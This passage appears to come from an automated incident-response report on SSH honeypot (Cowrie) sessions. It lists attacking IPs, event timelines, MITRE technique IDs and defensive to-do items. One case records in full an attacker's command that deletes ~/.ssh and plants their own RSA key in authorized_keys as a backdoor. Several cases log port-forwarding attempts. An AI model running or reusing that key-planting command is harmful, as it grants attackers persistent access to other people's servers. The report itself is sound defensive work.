- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36768c5896a8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:15 |
| **Last Seen** | 2026-11-14 00:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_91069566f3f46bf0f547ecca23d5644c_small_control'"'"' '"'"'check_91069566f3f46bf0f547ecca23d5644c'"'"'', printf '\n%s|%s\n' 'check_91069566f3f46bf0f547ecca23d5644c_small_control' 'check_91069566f3f46bf0f547ecca23d5644c', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_91069566f3f46bf0f547ecca23d5644c_small_math'"'"' "$((238*589+73))"', (238*589+73, printf '\n%s|%s\n' 'check_91069566f3f46bf0f547ecca23d5644c_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:15:30` | `cowrie.session.connect` |
| `2026-11-14 00:15:31` | `cowrie.client.version` |
| `2026-11-14 00:15:31` | `cowrie.client.kex` |
| `2026-11-14 00:15:32` | `cowrie.login.success` |
| `2026-11-14 00:15:33` | `cowrie.client.size` |
| `2026-11-14 00:15:34` | `cowrie.session.params` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| `2026-11-14 00:15:34` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a5fd714476

| Field | Detail |
|---|---|
| **Source IP** | `102.110.7[.]41` |
| **First Seen** | 2026-11-14 00:16 |
| **Last Seen** | 2026-11-14 00:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:16:21` | `cowrie.session.connect` |
| `2026-11-14 00:16:21` | `cowrie.client.version` |
| `2026-11-14 00:16:21` | `cowrie.client.kex` |
| `2026-11-14 00:16:22` | `cowrie.login.success` |
| `2026-11-14 00:16:22` | `cowrie.direct-tcpip.request` |
| `2026-11-14 00:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.110.7[.]41` to AbuseIPDB if not already reported
- [ ] Block `102.110.7[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9551f52d87

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:17 |
| **Last Seen** | 2026-11-14 00:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_315ef76345361d36d30ff153974671c4_small_control'"'"' '"'"'check_315ef76345361d36d30ff153974671c4'"'"'', printf '\n%s|%s\n' 'check_315ef76345361d36d30ff153974671c4_small_control' 'check_315ef76345361d36d30ff153974671c4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_315ef76345361d36d30ff153974671c4_small_math'"'"' "$((675*899+29))"', (675*899+29, printf '\n%s|%s\n' 'check_315ef76345361d36d30ff153974671c4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:17:06` | `cowrie.session.connect` |
| `2026-11-14 00:17:06` | `cowrie.client.version` |
| `2026-11-14 00:17:06` | `cowrie.client.kex` |
| `2026-11-14 00:17:08` | `cowrie.login.success` |
| `2026-11-14 00:17:09` | `cowrie.client.size` |
| `2026-11-14 00:17:10` | `cowrie.session.params` |
| `2026-11-14 00:17:10` | `cowrie.command.input` |
| `2026-11-14 00:17:10` | `cowrie.command.input` |
| `2026-11-14 00:17:10` | `cowrie.command.input` |
| `2026-11-14 00:17:10` | `cowrie.command.input` |
| `2026-11-14 00:17:10` | `cowrie.command.input` |
| `2026-11-14 00:17:10` | `cowrie.command.input` |
| `2026-11-14 00:17:10` | `cowrie.command.input` |
| `2026-11-14 00:17:11` | `cowrie.command.input` |
| `2026-11-14 00:17:11` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5c6dd9e5b3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:18 |
| **Last Seen** | 2026-11-14 00:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c89a84b169ff39bfc64e8ace9f91af75_small_control'"'"' '"'"'check_c89a84b169ff39bfc64e8ace9f91af75'"'"'', printf '\n%s|%s\n' 'check_c89a84b169ff39bfc64e8ace9f91af75_small_control' 'check_c89a84b169ff39bfc64e8ace9f91af75', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c89a84b169ff39bfc64e8ace9f91af75_small_math'"'"' "$((508*276+42))"', (508*276+42, printf '\n%s|%s\n' 'check_c89a84b169ff39bfc64e8ace9f91af75_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:18:37` | `cowrie.session.connect` |
| `2026-11-14 00:18:37` | `cowrie.client.version` |
| `2026-11-14 00:18:37` | `cowrie.client.kex` |
| `2026-11-14 00:18:39` | `cowrie.login.success` |
| `2026-11-14 00:18:41` | `cowrie.client.size` |
| `2026-11-14 00:18:41` | `cowrie.session.params` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| `2026-11-14 00:18:42` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40cad7d02522

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:20 |
| **Last Seen** | 2026-11-14 00:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3e8dd719d3881a27c6beee85739f125c_small_control'"'"' '"'"'check_3e8dd719d3881a27c6beee85739f125c'"'"'', printf '\n%s|%s\n' 'check_3e8dd719d3881a27c6beee85739f125c_small_control' 'check_3e8dd719d3881a27c6beee85739f125c', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3e8dd719d3881a27c6beee85739f125c_small_math'"'"' "$((62*561+9))"', (62*561+9, printf '\n%s|%s\n' 'check_3e8dd719d3881a27c6beee85739f125c_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:20:07` | `cowrie.session.connect` |
| `2026-11-14 00:20:07` | `cowrie.client.version` |
| `2026-11-14 00:20:07` | `cowrie.client.kex` |
| `2026-11-14 00:20:09` | `cowrie.login.success` |
| `2026-11-14 00:20:10` | `cowrie.client.size` |
| `2026-11-14 00:20:11` | `cowrie.session.params` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| `2026-11-14 00:20:11` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-416a3a9c53ad

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:21 |
| **Last Seen** | 2026-11-14 00:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2d77e88289449a79e14accac434de878_small_control'"'"' '"'"'check_2d77e88289449a79e14accac434de878'"'"'', printf '\n%s|%s\n' 'check_2d77e88289449a79e14accac434de878_small_control' 'check_2d77e88289449a79e14accac434de878', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_2d77e88289449a79e14accac434de878_small_math'"'"' "$((673*63+97))"', (673*63+97, printf '\n%s|%s\n' 'check_2d77e88289449a79e14accac434de878_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:21:36` | `cowrie.session.connect` |
| `2026-11-14 00:21:36` | `cowrie.client.version` |
| `2026-11-14 00:21:36` | `cowrie.client.kex` |
| `2026-11-14 00:21:37` | `cowrie.login.success` |
| `2026-11-14 00:21:39` | `cowrie.client.size` |
| `2026-11-14 00:21:39` | `cowrie.session.params` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| `2026-11-14 00:21:40` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f931c9d58804

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:23 |
| **Last Seen** | 2026-11-14 00:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_994cced7eacb4dab8917d8f57cb73852_small_control'"'"' '"'"'check_994cced7eacb4dab8917d8f57cb73852'"'"'', printf '\n%s|%s\n' 'check_994cced7eacb4dab8917d8f57cb73852_small_control' 'check_994cced7eacb4dab8917d8f57cb73852', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_994cced7eacb4dab8917d8f57cb73852_small_math'"'"' "$((362*429+57))"', (362*429+57, printf '\n%s|%s\n' 'check_994cced7eacb4dab8917d8f57cb73852_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:23:06` | `cowrie.session.connect` |
| `2026-11-14 00:23:06` | `cowrie.client.version` |
| `2026-11-14 00:23:06` | `cowrie.client.kex` |
| `2026-11-14 00:23:08` | `cowrie.login.success` |
| `2026-11-14 00:23:09` | `cowrie.client.size` |
| `2026-11-14 00:23:10` | `cowrie.session.params` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| `2026-11-14 00:23:10` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5938d50dea3b

| Field | Detail |
|---|---|
| **Source IP** | `68.225.62[.]203` |
| **First Seen** | 2026-11-14 00:24 |
| **Last Seen** | 2026-11-14 00:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:24:36` | `cowrie.session.connect` |
| `2026-11-14 00:24:37` | `cowrie.client.version` |
| `2026-11-14 00:24:37` | `cowrie.client.kex` |
| `2026-11-14 00:24:38` | `cowrie.login.success` |
| `2026-11-14 00:24:39` | `cowrie.direct-tcpip.request` |
| `2026-11-14 00:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.225.62[.]203` to AbuseIPDB if not already reported
- [ ] Block `68.225.62[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9ed761b9b10

| Field | Detail |
|---|---|
| **Source IP** | `114.220.176[.]69` |
| **First Seen** | 2026-11-14 00:24 |
| **Last Seen** | 2026-11-14 00:29 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:24:36` | `cowrie.session.connect` |
| `2026-11-14 00:24:36` | `cowrie.client.version` |
| `2026-11-14 00:24:36` | `cowrie.client.kex` |
| `2026-11-14 00:24:37` | `cowrie.login.success` |
| `2026-11-14 00:24:38` | `cowrie.session.params` |
| `2026-11-14 00:24:38` | `cowrie.command.input` |
| `2026-11-14 00:24:38` | `cowrie.command.failed` |
| `2026-11-14 00:24:38` | `cowrie.log.closed` |
| `2026-11-14 00:24:39` | `cowrie.session.params` |
| `2026-11-14 00:24:39` | `cowrie.command.input` |
| `2026-11-14 00:24:39` | `cowrie.session.file_download` |
| `2026-11-14 00:24:39` | `cowrie.log.closed` |
| `2026-11-14 00:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.176[.]69` to AbuseIPDB if not already reported
- [ ] Block `114.220.176[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eb3f830a88d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:24 |
| **Last Seen** | 2026-11-14 00:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d0d188d014ada9c38425612016865395_small_control'"'"' '"'"'check_d0d188d014ada9c38425612016865395'"'"'', printf '\n%s|%s\n' 'check_d0d188d014ada9c38425612016865395_small_control' 'check_d0d188d014ada9c38425612016865395', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d0d188d014ada9c38425612016865395_small_math'"'"' "$((617*340+11))"', (617*340+11, printf '\n%s|%s\n' 'check_d0d188d014ada9c38425612016865395_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:24:43` | `cowrie.session.connect` |
| `2026-11-14 00:24:43` | `cowrie.client.version` |
| `2026-11-14 00:24:43` | `cowrie.client.kex` |
| `2026-11-14 00:24:45` | `cowrie.login.success` |
| `2026-11-14 00:24:46` | `cowrie.client.size` |
| `2026-11-14 00:24:46` | `cowrie.session.params` |
| `2026-11-14 00:24:46` | `cowrie.command.input` |
| `2026-11-14 00:24:46` | `cowrie.command.input` |
| `2026-11-14 00:24:46` | `cowrie.command.input` |
| `2026-11-14 00:24:46` | `cowrie.command.input` |
| `2026-11-14 00:24:46` | `cowrie.command.input` |
| `2026-11-14 00:24:46` | `cowrie.command.input` |
| `2026-11-14 00:24:47` | `cowrie.command.input` |
| `2026-11-14 00:24:47` | `cowrie.command.input` |
| `2026-11-14 00:24:47` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beacabb88848

| Field | Detail |
|---|---|
| **Source IP** | `70.184.75[.]32` |
| **First Seen** | 2026-11-14 00:24 |
| **Last Seen** | 2026-11-14 00:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:24:44` | `cowrie.session.connect` |
| `2026-11-14 00:24:45` | `cowrie.client.version` |
| `2026-11-14 00:24:45` | `cowrie.client.kex` |
| `2026-11-14 00:24:47` | `cowrie.login.success` |
| `2026-11-14 00:24:48` | `cowrie.direct-tcpip.request` |
| `2026-11-14 00:24:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.184.75[.]32` to AbuseIPDB if not already reported
- [ ] Block `70.184.75[.]32` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3fb4cb56594

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:26 |
| **Last Seen** | 2026-11-14 00:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c8b598733ebddae9f239ab4200dc7a3e_small_control'"'"' '"'"'check_c8b598733ebddae9f239ab4200dc7a3e'"'"'', printf '\n%s|%s\n' 'check_c8b598733ebddae9f239ab4200dc7a3e_small_control' 'check_c8b598733ebddae9f239ab4200dc7a3e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c8b598733ebddae9f239ab4200dc7a3e_small_math'"'"' "$((535*379+69))"', (535*379+69, printf '\n%s|%s\n' 'check_c8b598733ebddae9f239ab4200dc7a3e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:26:23` | `cowrie.session.connect` |
| `2026-11-14 00:26:23` | `cowrie.client.version` |
| `2026-11-14 00:26:23` | `cowrie.client.kex` |
| `2026-11-14 00:26:24` | `cowrie.login.success` |
| `2026-11-14 00:26:25` | `cowrie.client.size` |
| `2026-11-14 00:26:26` | `cowrie.session.params` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| `2026-11-14 00:26:26` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fce445144a1

| Field | Detail |
|---|---|
| **Source IP** | `46.59.109[.]199` |
| **First Seen** | 2026-11-14 00:26 |
| **Last Seen** | 2026-11-14 00:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:26:54` | `cowrie.session.connect` |
| `2026-11-14 00:26:55` | `cowrie.client.version` |
| `2026-11-14 00:26:55` | `cowrie.client.kex` |
| `2026-11-14 00:26:56` | `cowrie.login.success` |
| `2026-11-14 00:26:57` | `cowrie.direct-tcpip.request` |
| `2026-11-14 00:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.59.109[.]199` to AbuseIPDB if not already reported
- [ ] Block `46.59.109[.]199` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3c817a3835a

| Field | Detail |
|---|---|
| **Source IP** | `177.43.105[.]11` |
| **First Seen** | 2026-11-14 00:27 |
| **Last Seen** | 2026-11-14 00:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:27:02` | `cowrie.session.connect` |
| `2026-11-14 00:27:03` | `cowrie.client.version` |
| `2026-11-14 00:27:03` | `cowrie.client.kex` |
| `2026-11-14 00:27:05` | `cowrie.login.success` |
| `2026-11-14 00:27:06` | `cowrie.direct-tcpip.request` |
| `2026-11-14 00:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.43.105[.]11` to AbuseIPDB if not already reported
- [ ] Block `177.43.105[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (101) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-eb40a12a5848 | HIGH | `195.178.110[.]228` | 2026-11-14 00:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b07c6cb9ffdb | HIGH | `195.178.110[.]228` | 2026-11-14 00:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7ab770958592 | HIGH | `195.178.110[.]228` | 2026-11-14 00:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0a93f5574eaa | HIGH | `195.178.110[.]228` | 2026-11-14 00:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-48ca20fdf7b3 | HIGH | `195.178.110[.]228` | 2026-11-14 00:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-de0a8ff43dcd | HIGH | `195.178.110[.]228` | 2026-11-14 00:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cabe469df8d2 | HIGH | `77.239.124[.]252` | 2026-11-14 00:37 | Y | 0 | 0 | `T1078` |
| IR-e11522b14730 | HIGH | `195.178.110[.]228` | 2026-11-14 00:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-092310143f44 | HIGH | `195.178.110[.]228` | 2026-11-14 00:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5fd8b8e4a81a | HIGH | `195.178.110[.]228` | 2026-11-14 00:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e49371ee441a | HIGH | `50.217.40[.]11` | 2026-11-14 00:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-568f8765f28b | HIGH | `193.32.162[.]15` | 2026-11-14 00:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cf5c7f9c867d | HIGH | `218.219.193[.]151` | 2026-11-14 00:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bd5e282b8027 | HIGH | `195.178.110[.]228` | 2026-11-14 00:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d550072ad367 | HIGH | `195.178.110[.]228` | 2026-11-14 00:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-08c6f855fec6 | HIGH | `186.96.158[.]180` | 2026-11-14 00:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-69901b05f481 | HIGH | `186.96.158[.]180` | 2026-11-14 00:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4d2693a6a374 | HIGH | `195.178.110[.]228` | 2026-11-14 00:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-041ab13b3c6b | HIGH | `183.82.111[.]224` | 2026-11-14 00:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-42f97b96149d | HIGH | `183.82.111[.]224` | 2026-11-14 00:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7ef4c819250a | HIGH | `195.178.110[.]228` | 2026-11-14 00:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-80b58954c1a8 | HIGH | `195.178.110[.]228` | 2026-11-14 00:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9bddb5d874bf | HIGH | `195.178.110[.]228` | 2026-11-14 00:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1506c9a8f039 | HIGH | `195.178.110[.]228` | 2026-11-14 00:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-60328e3656ba | HIGH | `195.178.110[.]228` | 2026-11-14 00:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-db8441dbd6ec | HIGH | `195.178.110[.]228` | 2026-11-14 00:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d7adcc406ceb | HIGH | `195.178.110[.]228` | 2026-11-14 00:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
